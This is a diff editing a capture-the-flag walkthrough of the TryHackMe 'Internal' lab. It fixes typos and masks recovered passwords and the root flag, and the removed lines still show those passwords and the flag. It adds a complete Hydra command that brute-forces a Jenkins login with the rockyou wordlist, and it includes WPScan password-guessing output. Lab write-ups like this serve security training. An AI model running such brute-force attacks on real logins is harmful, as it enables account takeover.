@@ -133,7 +133,7 @@ http://internal.thm/server-status (Status: 403)
 ===============================================================
 ```
 
-We have a number of interesting subfolders. The one that jumps out is WordPress, because when doing CTFs that is often the starting point. Trying /wordpress redirects us to /bog:
+We have a number of interesting subfolders. The one that jumps out is WordPress, because when doing CTFs that is often the starting point. Trying /wordpress redirects us to /blog:
 
 ![internal-blog](/assets/images/2021-03-02-22-25-04.png)
 
@@ -325,7 +325,7 @@ Interesting Finding(s):
 Trying admin / marquez Time: 00:00:45 <                                                     > (3900 / 14348292)  0.02%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
- | Username: admin, Password: my2boys
+ | Username: admin, Password: <HIDDEN>
 
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
@@ -483,7 +483,7 @@ Bill,
 
 Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
 
-aubreanna:bubb13guM!@#123
+aubreanna:<HIDDEN>
 www-data@internal:/opt$ 
 ```
 
@@ -502,7 +502,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
 Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
 ```
 
-Interesting to see there is an IP address for docker, something that may be relevant later. Let's grab the user flag:
+Interesting to see there is an IP address for Docker, something that may be relevant later. Let's grab the user flag:
 
 ```text
 aubreanna@internal:~$ cd /home/aubreanna/
@@ -522,7 +522,7 @@ aubreanna@internal:~$ cat jenkins.txt
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
-More clues to what Docker is used for. We know from earlier that it's running on IP 172.17.0.1, now we see Jenkins is may be running on that same network. So suggests it is running in Docker. Let's do some digging:
+More clues to what Docker is used for. We know from earlier that it's running on IP 172.17.0.1, now we see Jenkins may be running on that same network. So suggests it is running in Docker. Let's do some digging:
 
 ```text
 aubreanna@internal:~$ arp
@@ -597,6 +597,7 @@ Forward the response from Burp, then look back a the login page to see what the 
 We now have all the information needed to use Hydra with a wordlist and attempt to find a password:
 
 ```text
+root@kali:/home/kali/thm/internal# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-04 22:14:30
 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
@@ -669,7 +670,7 @@ Aubreanna,
 Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
 need access to the root user account.
 
-root:tr0ub13guM!@#123
+root:<HIDDEN>
 ```
 
 At last we've found a user name and password for root. Let's try it:
@@ -706,7 +707,7 @@ total 48
 4 drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
 
 root@internal:~# cat root.txt 
-THM{d0ck3r_d3str0y3r}
+<HIDDEN>
 root@internal:~# 
 ```
 
